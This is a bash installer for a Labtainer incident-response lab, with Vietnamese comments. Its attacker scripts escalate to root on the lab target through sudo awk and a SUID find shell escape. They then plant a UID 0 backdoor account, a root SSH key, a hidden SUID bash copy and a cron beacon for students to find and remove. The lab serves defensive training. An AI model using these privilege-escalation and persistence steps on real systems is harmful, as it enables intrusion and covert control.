#!/bin/bash
# ============================================================================
# soc-privesc FLAGSHIP (IR + A ca nhan hoa/timeline/containment + B4 multi-persistence, realistic)
# Chay tren VM:  bash install-soc-privesc.sh ; roi rebuild soc-privesc
# ============================================================================
set -e
if [ -z "$LABTAINER_DIR" ]; then echo "LOI: chua co bien LABTAINER_DIR"; exit 1; fi
LAB=$LABTAINER_DIR/labs/soc-privesc
echo ">> Tao thu muc lab tai $LAB"; rm -rf "$LAB"; mkdir -p "$LAB"
mkdir -p "$LAB/attacker/_bin"
cat > "$LAB/attacker/_bin/fixlocal.sh" <<'__EOF_PE_3w8n__'
#!/bin/bash
# Chay LAN DAU tren container attacker (an). Khoi dong vong lap leo quyen ngam.
setsid bash /home/ubuntu/attack.sh >/home/ubuntu/attack.log 2>&1 < /dev/null &
exit 0
__EOF_PE_3w8n__
mkdir -p "$LAB/attacker"
cat > "$LAB/attacker/attack.sh" <<'__EOF_PE_3w8n__'
#!/bin/bash
# Ke tan cong THUC TE, chia 3 GIAI DOAN TACH BIET de dung lai TIMELINE (moc gio khac nhau):
#   (1) ACCESS      : dang nhap tai khoan thuong (ghi 'Accepted ... from attacker' vao auth.log)
#   (2) ESCALATION  : ~2' sau, leo len root qua sudo awk (chung minh ca SUID find)
#   (3) PERSISTENCE : ~2' sau, cai NHIEU LOP persistence (plant.sh -> useradd ghi 'new user')
# Ten ca nhan hoa (EMPNUM). Cac moc gio di vao auth.log -> SV doc lai tu SIEM/auth.log.
TARGET=target
VICTIM=empEMPNUM;  VPW=Password123
BDUSER=svc-EMPNUM
OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 \
-o PreferredAuthentications=password -o PubkeyAuthentication=no"
run_v() { sshpass -p "$VPW" ssh $OPTS "$VICTIM@$TARGET" "$1" 2>/dev/null; }

# Cho sshd san sang
for i in $(seq 1 90); do
  timeout 3 bash -c "echo > /dev/tcp/${TARGET}/22" 2>/dev/null && break
  sleep 2
done
sleep 60   # cho target hoan tat cau hinh (sudoers/SUID/rsyslog)

# ===== (1) INITIAL ACCESS: dang nhap tai khoan thuong -> moc TIME_ACCESS =====
until run_v "id >/dev/null 2>&1"; do sleep 5; done

sleep 120   # khoang cach de moc TIME_ESCALATION tach ro khoi TIME_ACCESS trong log

# ===== (2) PRIVILEGE ESCALATION: leo len root qua sudo awk -> moc TIME_ESCALATION =====
# Retry den khi thanh cong (sudo log 'COMMAND=/usr/bin/awk' phai xuat hien de SV doc duoc moc nay).
# Xac nhan qua /tmp/.rootproof (644 -> tai khoan thuong doc duoc).
for i in $(seq 1 12); do
  run_v "sudo -n awk 'BEGIN{system(\"id > /tmp/.rootproof 2>/dev/null; chmod 644 /tmp/.rootproof 2>/dev/null; echo escalated_via_sudo_awk >> /root/.breach 2>/dev/null\")}'"
  run_v "test -s /tmp/.rootproof" && break
  sleep 10
done
# Chung minh duong SUID find cung leo quyen duoc (bang chung cho VECTOR1)
run_v "find /etc/hostname -exec /bin/bash -p -c 'echo also_escalated_via_suid_find >> /root/.breach' \\;"

sleep 120   # khoang cach de moc TIME_PERSIST tach ro khoi TIME_ESCALATION

# ===== (3) PERSISTENCE: cai NHIEU LOP (plant.sh). Retry den khi backdoor ton tai -> moc TIME_PERSIST =====
for i in $(seq 1 15); do
  sshpass -p "$VPW" scp $OPTS /home/ubuntu/plant.sh "$VICTIM@$TARGET:/tmp/plant.sh" 2>/dev/null
  run_v "sudo -n awk 'BEGIN{system(\"bash /tmp/plant.sh 2>/dev/null\")}'"
  run_v "id $BDUSER >/dev/null 2>&1" && break
  sleep 20
done

# Khong beacon bang SSH lai nua: cronjob doc (plant.sh da cai) tu chay moi 2' = tin hieu dinh ky.
# Giu container song.
while true; do sleep 3600; done
__EOF_PE_3w8n__
mkdir -p "$LAB/attacker"
cat > "$LAB/attacker/plant.sh" <<'__EOF_PE_3w8n__'
#!/bin/bash
# Chay voi quyen ROOT (duoc goi qua sudo awk trong phien leo quyen dau tien).
# Cai NHIEU LOP persistence du thua - dung kich ban attacker sau khi chiem root.
BDUSER=svc-EMPNUM
BDPW=S3rv1ce_2026
BK_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqajDhA9dB2bZd8K2hXc9jF3kLmN0pQrStUvWxYz1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPbackdoorKEY backdoor@attacker"

# (1) Tai khoan backdoor UID 0
/usr/sbin/useradd -o -u 0 -g 0 -M -d /root -s /bin/bash "$BDUSER" 2>/dev/null
echo "$BDUSER:$BDPW" | /usr/sbin/chpasswd 2>/dev/null

# (2) SSH key backdoor trong /root/.ssh -> quay lai bang KEY (prohibit-password van cho key)
mkdir -p /root/.ssh; chmod 700 /root/.ssh
grep -q 'backdoor@attacker' /root/.ssh/authorized_keys 2>/dev/null || echo "$BK_KEY" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# (3) SUID backdoor an (ban sao bash co bit SUID root)
cp /bin/bash /usr/local/bin/.dbus-cache 2>/dev/null
chmod 4755 /usr/local/bin/.dbus-cache 2>/dev/null

# (4) Cronjob doc - beacon dinh ky (tin hieu "ke tan cong con hoat dong")
printf '%s\n' '*/2 * * * * root /bin/bash -c "id >> /tmp/.cronbeacon 2>/dev/null"' > /etc/cron.d/sysbackup
chmod 644 /etc/cron.d/sysbackup

echo "escalated_via_sudo_awk_then_planted_persistence_$BDUSER" >> /root/.breach
rm -f /tmp/plant.sh 2>/dev/null
__EOF_PE_3w8n__
mkdir -p "$LAB/config"
cat > "$LAB/config/about.txt" <<'__EOF_PE_3w8n__'
SOC Lab - Dieu tra & Ung pho su co Leo thang dac quyen (Incident Response).
May target da bi xam nhap: mot tai khoan thuong bi chiem, ke tan cong leo len root
qua loi cau hinh va cai BACKDOOR de quay lai. Nhiem vu: dung lai chuoi tan cong (kill
chain) qua SIEM/log, go sach backdoor, bit cac duong leo quyen va chan ke tan cong quay lai.
__EOF_PE_3w8n__
mkdir -p "$LAB/config"
cat > "$LAB/config/parameter.config" <<'__EOF_PE_3w8n__'
# parameter.config - ca nhan hoa chong chep (A1)
# EMPNUM: so ngau nhien 1000-9999, dung cho CA target lan attacker (cung mot gia tri):
#  - tai khoan bi chiem  = emp<EMPNUM>
#  - tai khoan backdoor  = svc-<EMPNUM>
# => moi sinh vien phai TU tim ra ten tai khoan cua minh de dieu tra + go bo (khong chep duoc).
EMPNUM : RAND_REPLACE : target:.local/bin/fixlocal.sh;attacker:attack.sh;attacker:plant.sh : EMPNUM : 1000 : 9999
__EOF_PE_3w8n__
mkdir -p "$LAB/config"
cat > "$LAB/config/start.config" <<'__EOF_PE_3w8n__'
# start.config - Lab soc-privesc (Leo thang dac quyen -> dieu tra -> hardening)
# target co 2 lo hong privesc (SUID find + sudo NOPASSWD awk). Tai khoan emp<EMPNUM> bi chiem.
# attacker (an) dung foothold emp<EMPNUM> de leo len root. Hoc vien san vet qua SIEM roi va ca 2.

GLOBAL_SETTINGS
	LAB_MASTER_SEED soc-privesc_student_master_seed
	GRADE_CONTAINER target

NETWORK  SOC_NET
	MASK 172.20.0.0/24
	GATEWAY 172.20.0.101

# --- May nan nhan: co 2 lo hong leo quyen, noi hoc vien dieu tra + va ---
CONTAINER target
	USER ubuntu
	SOC_NET 172.20.0.10
	ADD-HOST attacker:172.20.0.5
	ADD-HOST siem:172.20.0.20
	TERMINALS 1

# --- Ke tan cong: dung foothold emp<EMPNUM> leo quyen root, chay ngam ---
CONTAINER attacker
	USER ubuntu
	SOC_NET 172.20.0.5
	ADD-HOST target:172.20.0.10
	TERMINALS 0

# --- SIEM: chay Wazuh (indexer + server + dashboard) ---
CONTAINER siem
	USER ubuntu
	SOC_NET 172.20.0.20
	ADD-HOST target:172.20.0.10
	ADD-HOST attacker:172.20.0.5
	TERMINALS 1

# --- DEFENDER: tram analyst, Firefox xem dashboard + SSH hardening ---
CONTAINER defender
	USER ubuntu
	SOC_NET 172.20.0.30
	ADD-HOST siem:172.20.0.20
	ADD-HOST target:172.20.0.10
	ADD-HOST attacker:172.20.0.5
	X11 YES
	TERMINALS 1
__EOF_PE_3w8n__
mkdir -p "$LAB/defender/_bin"
cat > "$LAB/defender/_bin/student_startup.sh" <<'__EOF_PE_3w8n__'
#!/bin/bash
# Chay trong terminal ao cua defender. Mo Wazuh dashboard trong Firefox.
# Chi chay duoi quyen user thuong (khong phai root).
if ! id | grep -q 'uid=0'; then
  ( firefox https://172.20.0.20 >/dev/null 2>&1 & )
fi
__EOF_PE_3w8n__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-privesc.attacker.student" <<'__EOF_PE_3w8n__'
#
# Labtainer Dockerfile - attacker (leo quyen qua foothold emp<EMPNUM>, an)
#
ARG registry
FROM $registry/labtainer.network
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# sshpass: SSH khong tuong tac bang mat khau emp<EMPNUM>
RUN apt-get update && apt-get install -y --no-install-recommends sshpass openssh-client \
    && rm -rf /var/lib/apt/lists/* || true
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_PE_3w8n__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-privesc.defender.student" <<'__EOF_PE_3w8n__'
#
# Labtainer Dockerfile - defender (tram analyst, co Firefox xem dashboard Wazuh)
#
ARG registry
# firefox3 = Firefox moi (tren network3) - chay duoc dashboard Wazuh hien dai
FROM $registry/labtainer.firefox3
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# Firefox co san trong base firefox3; them ssh client de SSH sang target xu ly su co
RUN apt-get update || true; apt-get install -y --no-install-recommends openssh-client \
    && rm -rf /var/lib/apt/lists/*
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
# Base firefox3 co the da co san user 'ubuntu' -> chi tao neu chua co
RUN id -u $user_name >/dev/null 2>&1 || useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_PE_3w8n__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-privesc.siem.student" <<'__EOF_PE_3w8n__'
#
# Labtainer Dockerfile - siem (chay Wazuh: indexer + server + dashboard)
#
ARG registry
FROM $registry/labtainer.base2
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# Cong cu cho bake + cai offline (setcap = libcap2-bin)
RUN apt-get update && apt-get install -y --no-install-recommends curl gnupg tar libcap2-bin openssl \
    && rm -rf /var/lib/apt/lists/*
#
# Cho prestop doc alerts + agent_control khong can mat khau (de cham diem)
RUN echo 'ubuntu ALL=(ALL) NOPASSWD: /bin/cat /var/ossec/logs/alerts/alerts.log, /usr/bin/cat /var/ossec/logs/alerts/alerts.log, /var/ossec/bin/agent_control' > /etc/sudoers.d/labtainer-wazuh \
    && chmod 440 /etc/sudoers.d/labtainer-wazuh
#
# --- PRE-BAKE: tai goi Wazuh + tao chung chi luc BUILD (de first-boot cai OFFLINE) ---
RUN mkdir -p /root/wz && cd /root/wz \
 && curl -sO https://packages.wazuh.com/4.14/wazuh-install.sh \
 && bash wazuh-install.sh -dw deb -da amd64 \
 && curl -sO https://packages.wazuh.com/4.14/config.yml \
 && sed -i 's/<[a-z0-9-]*-ip>/127.0.0.1/g' config.yml \
 && bash wazuh-install.sh -g
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_PE_3w8n__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-privesc.target.student" <<'__EOF_PE_3w8n__'
#
# Labtainer Dockerfile - target (2 lo hong leo quyen + Wazuh agent)
#
ARG registry
# Base co openssh-server (sshd) + rsyslog -> emp<EMPNUM>/analyst SSH duoc
FROM $registry/labtainer.network.ssh
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# Cho prestop doc sudoers (440 root) khong mat khau
RUN echo '%sudo ALL=(ALL) NOPASSWD: /usr/bin/grep, /bin/grep, /usr/bin/cat, /bin/cat, /sbin/iptables, /usr/sbin/iptables' > /etc/sudoers.d/labtainer-pe \
    && chmod 440 /etc/sudoers.d/labtainer-pe
#
# Dam bao co sudo, findutils (find), mawk (awk), iptables (containment A3), cron (persistence B4)
RUN apt-get update && apt-get install -y --no-install-recommends sudo findutils mawk iptables cron \
    && rm -rf /var/lib/apt/lists/* || true
RUN systemctl enable cron 2>/dev/null || true
#
# --- Wazuh agent (bake, tro ve manager 172.20.0.20) ---
RUN apt-get update && apt-get install -y --no-install-recommends apt-transport-https ca-certificates curl gnupg && rm -rf /var/lib/apt/lists/*
RUN curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import \
    && chmod 644 /usr/share/keyrings/wazuh.gpg
RUN echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" > /etc/apt/sources.list.d/wazuh.list
RUN apt-get update && WAZUH_MANAGER="172.20.0.20" apt-get install -y wazuh-agent && rm -rf /var/lib/apt/lists/*
RUN systemctl enable wazuh-agent
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_PE_3w8n__
mkdir -p "$LAB/docs"
cat > "$LAB/docs/read_first.txt" <<'__EOF_PE_3w8n__'
================================================================================
 SOC LAB (FLAGSHIP): DIEU TRA & UNG PHO SU CO LEO THANG DAC QUYEN (INCIDENT RESPONSE)
================================================================================

1. TONG QUAN (OVERVIEW)
--------------------------------------------------------------------------------
Mot cuoc xam nhap vua xay ra tren may chu 'target'. He thong giam sat Wazuh ghi nhan
dang nhap quyen ROOT bat thuong tu mot dia chi noi bo la. Dieu tra so bo: ke tan cong
chiem mot tai khoan nguoi dung, LEO THANG len root qua loi cau hinh, va cai CUA SAU
(persistence) de quay lai. Ban la nhan vien SOC: dung lai chuoi tan cong, CACH LY,
GO SACH, va dam bao ke tan cong khong the quay lai.

LUU Y QUAN TRONG: moi may bi tan cong co ten tai khoan KHAC NHAU (ca nhan hoa). Ban PHAI
tu dieu tra ra ten tren he thong CUA MINH - khong the chep dap an cua ban khac.

2. MUC TIEU HOC TAP (OBJECTIVES)
--------------------------------------------------------------------------------
  - Dung dashboard Wazuh (Threat Hunting / FIM / MITRE) de phat hien & khoanh vung su co.
  - Dung lai CHUOI TAN CONG va TIMELINE: initial access -> privilege escalation -> persistence.
  - Tu liet ke cac duong leo quyen (SUID, sudo) va nhan dien persistence (backdoor UID 0).
  - Thuc hanh vong doi IR: CONTAINMENT (cach ly) truoc, roi ERADICATION (go bo).
  - Bao cao IOC chinh xac cho he thong cua minh (chong chep).

3. KIEN THUC NEN (BACKGROUND)
--------------------------------------------------------------------------------
* Vong doi IR (NIST): Detection -> CONTAINMENT (chan nguon, cat ket noi) -> ERADICATION
  (go persistence + bit lo hong) -> Recovery -> Lessons. Cach ly TRUOC de "cam mau",
  tranh ke tan cong pha hoai them trong luc ta don dep.
* SUID: file co bit SUID (vd 4755) chay voi EUID chu so huu (root). Chuong trinh "thoat
  shell duoc" + SUID root -> ai cung lay shell root. Tra cuu: https://gtfobins.github.io
* sudo NOPASSWD: cho chay lenh voi quyen root khong can mat khau. Neu lenh thoat shell
  duoc (awk/less/vim/find) -> leo len root.
* Persistence - backdoor UID 0: tai khoan co UID=0 (tuong duong root) nhung ten "vo hai".
  Moi tai khoan UID 0 ngoai 'root' deu dang ngo.
* Wazuh dashboard: Threat Hunting (loc su kien theo thoi gian/agent/rule - dung dung timeline),
  Integrity Monitoring/FIM (file bi them/sua), MITRE ATT&CK (map alert -> technique).

4. MOI TRUONG & SO DO (TOPOLOGY)
--------------------------------------------------------------------------------
  attacker (172.20.0.5, AN)  -- ke tan cong (foothold + backdoor), dinh ky quay lai
  target   (172.20.0.10)     -- may bi xam nhap; co Wazuh agent
  siem     (172.20.0.20)     -- Wazuh (dashboard https://172.20.0.20)
  defender (172.20.0.30)     -- tram cua ban: Firefox + SSH de ung pho
  Ung pho:  ssh analyst@target   (mat khau: analyst)
  *** Cho siem cai Wazuh (~8-10'):  tail -f /var/log/wazuh-install.log .
      Ke tan cong ra tay theo 3 GIAI DOAN cach nhau ~2': (1) dang nhap -> (2) leo quyen ->
      (3) cai backdoor. Hay cho ~12-15' ke tu khi start lab de ca chuoi tan cong hoan tat
      (kiem tra: tren target da xuat hien tai khoan UID 0 la) roi hay dieu tra/ung pho. ***

5. NHIEM VU (TASKS)
--------------------------------------------------------------------------------
--- Task 1: Phat hien & khoanh vung (DUNG DASHBOARD) ---
  Dashboard Wazuh (admin / pass: tren siem `sudo cat /root/wazuh-admin-credentials.txt`).
  - Threat Hunting / Security events: tim dang nhap quyen cao tu IP la -> ghi IP ke tan cong.
  - Integrity Monitoring (FIM): thu muc/file nao bi thay doi (/etc/passwd, /root, /tmp)?

--- Task 2: Dung lai KILL CHAIN + TIMELINE (A2) ---
  Dung dashboard (loc theo thoi gian) + auth.log tren target (sudo grep ... /var/log/auth.log):
  - Tai khoan NAO bi chiem (dang nhap tu IP ke tan cong)? -> ghi vao COMPROMISED.
  - No leo quyen bang duong nao? Tu kiem 2 huong: (a) file SUID bat thuong (goi y: `find`
    voi -perm), (b) quyen sudo cua tai khoan do (goi y: liet ke quyen sudo; xem /etc/sudoers.d).
    GHI RO CO CHE vao VECTOR1/VECTOR2 (vd "SUID /usr/bin/find", "sudo NOPASSWD awk") - khong chi 1 tu.
  - TIMELINE: 3 moc tan cong xay ra o 3 THOI DIEM KHAC NHAU (cach nhau ~2'). Ghi GIO (HH:MM)
    theo DUNG THU TU:
    TIME_ACCESS   = luc tai khoan dang nhap dau tien tu IP ke tan cong ('Accepted ...').
    TIME_ESCALATION = luc chay 'sudo ... awk' (su kien sudo trong log).
    TIME_PERSIST  = luc tao tai khoan backdoor ('new user: ...' trong log).
    *** Moi container dung chung mui gio voi VM (ICT) -> gio tren auth.log va tren dashboard
        KHOP nhau. Grader cham theo gio trong auth.log tren target (dung sai +-1 phut).
        Nhap bua se TRUOT. ***

--- Task 3: Tim PERSISTENCE (ke tan cong cai NHIEU LOP du thua - tim HET) ---
  Ke tan cong gioi khong chi cai 1 cua sau. Dung Integrity Monitoring (FIM) tren dashboard
  (xem moi file bi them/sua) + soat tren target de tim DU CAC LOP sau:
  - Tai khoan UID 0 la (ngoai 'root')? (goi y: loc truong UID trong /etc/passwd) -> ghi BACKDOOR.
  - SSH key la trong /root/.ssh/authorized_keys? (cho phep vao thang root bang key)
  - File SUID bat thuong NGOAI /usr/bin/find? (goi y: `find / -perm -4000` - co ban sao shell an khong?)
  - Cronjob doc trong /etc/cron.d (hoac crontab)?
  LUU Y: bo sot BAT KY lop nao -> ke tan cong van quay lai duoc. Phai go SACH ca 4 (Task 5).

--- Task 4: CONTAINMENT (A3 - cach ly TRUOC) ---
  Truoc khi don dep, CAT duong ke tan cong co the quay lai (vd dung SSH key da cai):
  - Chan IP ke tan cong o tang mang (goi y: cong cu tuong lua iptables, luat DROP theo -s <IP>).
  - Kiem chung: khong con PHIEN dang nhap moi tu IP do (auth.log). Luu y: cronjob doc la
    persistence CUC BO - chan IP khong dung no; no chi dung khi bi GO o Task 5.

--- Task 5: ERADICATION (go sach MOI mat xich - bo sot 1 la chua xong) ---
  Bit 2 duong leo quyen:
    a) Vo hieu hoa bit SUID tren find (goi y: cong cu doi quyen file).
    b) Thu hoi quyen sudo nguy hiem (goi y: sua/xoa cau hinh trong /etc/sudoers.d/).
  Go HET 4 lop persistence tim o Task 3:
    c) Xoa tai khoan BACKDOOR UID 0. LUU Y: UID 0 thuong KHONG xoa duoc bang userdel thong
       thuong (bao "used by process 1") - hay ep xoa hoac sua truc tiep file dinh nghia tai khoan.
    d) Xoa dong SSH key la trong /root/.ssh/authorized_keys.
    e) Xoa file SUID backdoor an (file ban tim o Task 3).
    f) Xoa cronjob doc (/etc/cron.d).
  Khoa foothold:
    g) Khoa tai khoan nguoi dung bi chiem (goi y: khoa/doi mat khau).

--- Task 6: Kiem chung & bao cao ---
  Tu kiem chung: het SUID bat thuong; het sudo nguy hiem; het UID 0 la; IP da bi chan.
  Hoan tat /home/analyst/findings.txt (COMPROMISED, IP, VECTOR1/2, BACKDOOR, 3 moc TIME_*).

6. NOP BAI (SUBMISSION)
--------------------------------------------------------------------------------
  checkwork  -> tu kiem tra ;  stoplab -> nop bai.
Tieu chi "incident_resolved = Y": da CONTAINMENT (chan IP) + ERADICATION day du (go 2 duong
leo quyen SUID/sudo + go HET 4 lop persistence). Cac muc cham rieng:
  - reported_iocs          : bao cao dung vector (co che), tai khoan, backdoor, IP cua CHINH MINH.
  - timeline_reconstructed : 3 moc TIME_* khop GIO THAT trong log (+-1 phut) va dung thu tu.
  - contained / foothold_locked / suid_fixed / sudo_fixed / persistence_removed : theo end-state.
Luu y: checkwork chi cham VIEC BAN LAM - khong con muc nao "tu Y" khi lab vua khoi dong.
__EOF_PE_3w8n__
mkdir -p "$LAB/instr_config"
cat > "$LAB/instr_config/goals.config" <<'__EOF_PE_3w8n__'
# goals.config - IR flagship: Dieu tra & Ung pho leo thang dac quyen
# Chi cham VIEC SINH VIEN LAM (bo threat_detected/agent_connected vi chung tu Y khi lab chay).
# Co: A1 bao cao IOC ca nhan hoa, A2 timeline khop gio that, A3 containment.

# A1: bao cao dung IOC ca nhan hoa cua CHINH MINH (vector co che + tai khoan + backdoor + IP)
reported_iocs          = boolean : ( _rep_v1 and _rep_v2 and _rep_acct and _rep_bd and _rep_ip )
# A2: dung lai timeline - 3 moc KHOP GIO THAT trong log va dung thu tu
timeline_reconstructed = boolean : _timeline

# Ung pho theo vong doi IR
# A3: Containment (chan IP cat beacon)
contained              = boolean : _contained
# Eradication - bit duong leo quyen
suid_fixed             = boolean : ( _marker and_not _suid_vuln )
sudo_fixed             = boolean : ( _marker and_not _sudo_vuln )
# Eradication - go SACH persistence nhieu lop (B4): UID0 user + SSH key + SUID backdoor + cron
persistence_removed    = boolean : ( _marker and_not _backdoor and_not _sshkey and_not _suidbd and_not _cron )
foothold_locked        = boolean : ( _marker and_not _foothold_open )

# MUC TIEU TONG: Contain + Eradicate day du (chan IP + bit 2 duong leo quyen + go HET 4 lop persistence)
incident_resolved      = boolean : ( _marker and _contained and_not _suid_vuln and_not _sudo_vuln and_not _backdoor and_not _sshkey and_not _suidbd and_not _cron )
__EOF_PE_3w8n__
mkdir -p "$LAB/instr_config"
cat > "$LAB/instr_config/results.config" <<'__EOF_PE_3w8n__'
# results.config - cham diem IR + A1(ca nhan hoa) + A2(timeline khop gio that) + A3(containment)
# LUU Y: prestop chi in CO (presence flag)/OK, khong lo ten/gio -> chong chep tu prestop.stdout.

_marker      = target:prestop.stdout : FILE_REGEX : PRESTOP_MARKER
# Leo quyen 1: /usr/bin/find con SUID
_suid_vuln   = target:prestop.stdout : FILE_REGEX : SUID_VULN_PRESENT
# Leo quyen 2: con sudo NOPASSWD cho tai khoan bi chiem
_sudo_vuln   = target:prestop.stdout : FILE_REGEX : SUDO_VULN_PRESENT
# Persistence (B4 - nhieu lop, phai go HET):
_backdoor    = target:prestop.stdout : FILE_REGEX : UID0USER_PRESENT
_sshkey      = target:prestop.stdout : FILE_REGEX : SSHKEY_PRESENT
_suidbd      = target:prestop.stdout : FILE_REGEX : SUIDBD_PRESENT
_cron        = target:prestop.stdout : FILE_REGEX : CRONBD_PRESENT
# Foothold: tai khoan bi chiem CHUA bi khoa
_foothold_open = target:prestop.stdout : FILE_REGEX : FOOTHOLD_OPEN
# A3 Containment: da chan IP ke tan cong?
_contained   = target:prestop.stdout : FILE_REGEX : CONTAINED
# A1 Report (so khop ground-truth ca nhan hoa) + IP + co che vector
_rep_v1      = target:prestop.stdout : FILE_REGEX : REP_V1_OK
_rep_v2      = target:prestop.stdout : FILE_REGEX : REP_V2_OK
_rep_acct    = target:prestop.stdout : FILE_REGEX : REP_ACCT_OK
_rep_bd      = target:prestop.stdout : FILE_REGEX : REP_BD_OK
_rep_ip      = target:prestop.stdout : FILE_REGEX : REP_IP_OK
# A2 Timeline: ca 3 moc khop GIO THAT trong log va dung thu tu
_timeline    = target:prestop.stdout : FILE_REGEX : TIMELINE_OK

# --- Goi y checkwork ---
#CHECK_FALSE: Van con duong leo quyen SUID (/usr/bin/find con bit SUID). Hay vo hieu hoa bit SUID.
cw_suid = target:prestop.stdout : FILE_REGEX : SUID_VULN_PRESENT
#CHECK_FALSE: Van con sudo NOPASSWD cho tai khoan bi chiem. Hay thu hoi quyen sudo nay.
cw_sudo = target:prestop.stdout : FILE_REGEX : SUDO_VULN_PRESENT
#CHECK_FALSE: Van con BACKDOOR (tai khoan UID 0 la). Luu y: tai khoan UID 0 kho xoa bang userdel thuong.
cw_backdoor = target:prestop.stdout : FILE_REGEX : UID0USER_PRESENT
#CHECK_FALSE: Van con SSH key la trong /root/.ssh/authorized_keys. Hay xoa dong key cua ke tan cong.
cw_sshkey = target:prestop.stdout : FILE_REGEX : SSHKEY_PRESENT
#CHECK_FALSE: Van con SUID backdoor an (vd /usr/local/bin/.dbus-cache). Hay tim & xoa file SUID la.
cw_suidbd = target:prestop.stdout : FILE_REGEX : SUIDBD_PRESENT
#CHECK_FALSE: Van con cronjob doc (/etc/cron.d). Hay xoa cron cua ke tan cong.
cw_cron = target:prestop.stdout : FILE_REGEX : CRONBD_PRESENT
#CHECK_TRUE: Chua CONTAINMENT - hay chan IP ke tan cong (iptables ... -s 172.20.0.5 -j DROP) de cat beacon.
cw_contain = target:prestop.stdout : FILE_REGEX : CONTAINED
#CHECK_TRUE: Chua ghi du/dung IOC vao findings (tai khoan, vector co che, backdoor, IP - theo gia tri CUA BAN).
cw_report = target:prestop.stdout : FILE_REGEX : REP_BD_OK
#CHECK_TRUE: Chua dung lai timeline - 3 moc TIME_* phai KHOP GIO THAT trong auth.log/SIEM va dung thu tu.
cw_timeline = target:prestop.stdout : FILE_REGEX : TIMELINE_OK
__EOF_PE_3w8n__
mkdir -p "$LAB/siem/_bin"
